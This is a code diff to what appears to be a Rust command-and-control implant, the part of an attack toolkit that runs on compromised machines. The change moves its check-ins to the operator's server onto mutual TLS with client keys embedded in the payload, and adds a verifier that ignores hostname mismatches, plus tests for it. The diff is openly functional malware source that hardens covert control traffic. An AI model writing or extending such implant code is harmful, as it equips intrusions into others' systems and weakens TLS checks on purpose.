@@ -1,6 +1,11 @@
 use clap::Parser;
 use reqwest::Client;
+use rustls::client::{
+    HandshakeSignatureValid, ServerCertVerified, ServerCertVerifier, WebPkiVerifier,
+};
+use rustls::{ClientConfig, DigitallySignedStruct, RootCertStore, ServerName, SignatureScheme};
 use std::error::Error;
+use std::sync::Arc;
 use std::{
     net::UdpSocket,
     sync::atomic::{AtomicU64, Ordering},
@@ -11,6 +16,14 @@ use uuid::Uuid;
 
 use rb::message::{CheckinResponse, CommandOutput, ImplantCheckin};
 use rb::task::{Task, TaskResult, TaskStatus};
+
+/// PEM material embedded into a generated payload, or loaded from disk for a dev run.
+#[derive(Clone, Debug, Default)]
+pub struct TlsMaterial {
+    pub ca_cert_pem: String,
+    pub client_cert_pem: String,
+    pub client_key_pem: String,
+}
 
 /// CLI arguments for the implant
 #[derive(Parser, Debug, Clone)]
@@ -26,6 +39,22 @@ pub struct Args {
     /// Poll interval in seconds (default: 5)
     #[clap(long, default_value = "5")]
     pub interval: u64,
+
+    /// Path to the implant CA certificate (used when no embedded material is present).
+    #[clap(long, default_value = "certs/implant-ca-cert.pem")]
+    pub ca_path: String,
+
+    /// Path to the implant client certificate (used when no embedded material is present).
+    #[clap(long, default_value = "certs/implant-cert.pem")]
+    pub cert_path: String,
+
+    /// Path to the implant client key (used when no embedded material is present).
+    #[clap(long, default_value = "certs/implant-key.pem")]
+    pub key_path: String,
+
+    /// Embedded TLS material for generated payloads.
+    #[clap(skip)]
+    pub tls_material: Option<TlsMaterial>,
 }
 
 /// Main entrypoint for the implant logic.
@@ -34,14 +63,112 @@ pub async fn run_implant() -> Result<(), Box<dyn Error>> {
     run_implant_with_args(args).await
 }
 
+/// Verifies the server certificate chain but ignores a hostname mismatch.
+///
+/// The server cert only carries `localhost`/`127.0.0.1` SANs while implants connect by raw IP.
+/// The chain is still validated against the embedded CA.
+struct NoHostnameVerifier {
+    inner: WebPkiVerifier,
+}
+
+impl NoHostnameVerifier {
+    fn new(roots: RootCertStore) -> Self {
+        Self {
+            inner: WebPkiVerifier::new(roots, None),
+        }
+    }
+}
+
+impl ServerCertVerifier for NoHostnameVerifier {
+    fn verify_server_cert(
+        &self,
+        end_entity: &rustls::Certificate,
+        intermediates: &[rustls::Certificate],
+        server_name: &ServerName,
+        scts: &mut dyn Iterator<Item = &[u8]>,
+        ocsp_response: &[u8],
+        now: std::time::SystemTime,
+    ) -> Result<ServerCertVerified, rustls::Error> {
+        match self.inner.verify_server_cert(
+            end_entity,
+            intermediates,
+            server_name,
+            scts,
+            ocsp_response,
+            now,
+        ) {
+            Ok(verified) => Ok(verified),
+            Err(rustls::Error::InvalidCertificate(rustls::CertificateError::NotValidForName)) => {
+                Ok(ServerCertVerified::assertion())
+            }
+            Err(e) => Err(e),
+        }
+    }
+
+    fn verify_tls12_signature(
+        &self,
+        message: &[u8],
+        cert: &rustls::Certificate,
+        dss: &DigitallySignedStruct,
+    ) -> Result<HandshakeSignatureValid, rustls::Error> {
+        self.inner.verify_tls12_signature(message, cert, dss)
+    }
+
+    fn verify_tls13_signature(
+        &self,
+        message: &[u8],
+        cert: &rustls::Certificate,
+        dss: &DigitallySignedStruct,
+    ) -> Result<HandshakeSignatureValid, rustls::Error> {
+        self.inner.verify_tls13_signature(message, cert, dss)
+    }
+
+    fn supported_verify_schemes(&self) -> Vec<SignatureScheme> {
+        self.inner.supported_verify_schemes()
+    }
+}
+
+fn build_tls_client(material: &TlsMaterial) -> Result<Client, Box<dyn Error>> {
+    let mut roots = RootCertStore::empty();
+    for cert in rustls_pemfile::certs(&mut material.ca_cert_pem.as_bytes())? {
+        roots.add(&rustls::Certificate(cert))?;
+    }
+
+    let certs = rustls_pemfile::certs(&mut material.client_cert_pem.as_bytes())?
+        .into_iter()
+        .map(rustls::Certificate)
+        .collect::<Vec<_>>();
+
+    let key = rustls_pemfile::pkcs8_private_keys(&mut material.client_key_pem.as_bytes())?
+        .into_iter()
+        .next()
+        .ok_or("no private key in implant key PEM")?;
+
+    let verifier = Arc::new(NoHostnameVerifier::new(roots));
+    let config = ClientConfig::builder()
+        .with_safe_defaults()
+        .with_custom_certificate_verifier(verifier)
+        .with_client_auth_cert(certs, rustls::PrivateKey(key))?;
+
+    Ok(Client::builder().use_preconfigured_tls(config).build()?)
+}
+
 /// Runs the implant with explicitly provided arguments
 /// This allows the payload to hardcode values without CLI parsing
 pub async fn run_implant_with_args(args: Args) -> Result<(), Box<dyn Error>> {
-    // Build base URL
-    let base_url = format!("http://{}:{}", args.host, args.port);
+    // Embedded payload material wins; otherwise load the dev files.
+    let material = match &args.tls_material {
+        Some(material) => material.clone(),
+        None => TlsMaterial {
+            ca_cert_pem: std::fs::read_to_string(&args.ca_path)?,
+            client_cert_pem: std::fs::read_to_string(&args.cert_path)?,
+            client_key_pem: std::fs::read_to_string(&args.key_path)?,
+        },
+    };
 
-    // Create HTTP client
-    let client = Client::new();
+    // Build base URL and TLS client
+    let base_url = format!("https://{}:{}", args.host, args.port);
+    let client = build_tls_client(&material)?;
 
     // Derive local IP by opening a UDP socket
     let ip_address = match get_local_ip(&args.host, args.port) {
@@ -726,5 +853,63 @@ mod tests {
         assert_eq!(std::fs::read(&path).unwrap(), b"payload");
 
         let _ = std::fs::remove_dir_all(&dir);
+    }
+
+    fn make_ca(common_name: &str) -> (rcgen::Certificate, rcgen::KeyPair) {
+        let key = rcgen::KeyPair::generate_for(&rcgen::PKCS_ECDSA_P256_SHA256).unwrap();
+        let mut params = rcgen::CertificateParams::new(Vec::new()).unwrap();
+        params
+            .distinguished_name
+            .push(rcgen::DnType::CommonName, common_name);
+        params.is_ca = rcgen::IsCa::Ca(rcgen::BasicConstraints::Unconstrained);
+        params.key_usages = vec![
+            rcgen::KeyUsagePurpose::KeyCertSign,
+            rcgen::KeyUsagePurpose::DigitalSignature,
+            rcgen::KeyUsagePurpose::CrlSign,
+        ];
+        let cert = params.self_signed(&key).unwrap();
+        (cert, key)
+    }
+
+    fn make_server_cert(
+        ca: &rcgen::Certificate,
+        ca_key: &rcgen::KeyPair,
+        san: &str,
+    ) -> rustls::Certificate {
+        let key = rcgen::KeyPair::generate_for(&rcgen::PKCS_ECDSA_P256_SHA256).unwrap();
+        let mut params = rcgen::CertificateParams::new(vec![san.to_string()]).unwrap();
+        params.is_ca = rcgen::IsCa::NoCa;
+        params.extended_key_usages = vec![rcgen::ExtendedKeyUsagePurpose::ServerAuth];
+        let cert = params.signed_by(&key, ca, ca_key).unwrap();
+        rustls::Certificate(cert.der().to_vec())
+    }
+
+    #[test]
+    fn verifier_ignores_hostname_but_checks_chain() {
+        let (ca, ca_key) = make_ca("Test CA");
+        let mut roots = RootCertStore::empty();
+        roots.add(&rustls::Certificate(ca.der().to_vec())).unwrap();
+        let verifier = NoHostnameVerifier::new(roots);
+        let server_name = ServerName::try_from("not-localhost.example").unwrap();
+        let now = std::time::SystemTime::now();
+
+        let cert = make_server_cert(&ca, &ca_key, "localhost");
+        let mut scts = std::iter::empty::<&[u8]>();
+        assert!(
+            verifier
+                .verify_server_cert(&cert, &[], &server_name, &mut scts, &[], now)
+                .is_ok(),
+            "hostname mismatch should be ignored"
+        );
+
+        let (other_ca, other_key) = make_ca("Other CA");
+        let other_cert = make_server_cert(&other_ca, &other_key, "localhost");
+        let mut scts = std::iter::empty::<&[u8]>();
+        assert!(
+            verifier
+                .verify_server_cert(&other_cert, &[], &server_name, &mut scts, &[], now)
+                .is_err(),
+            "untrusted CA should be rejected"
+        );
     }
 }
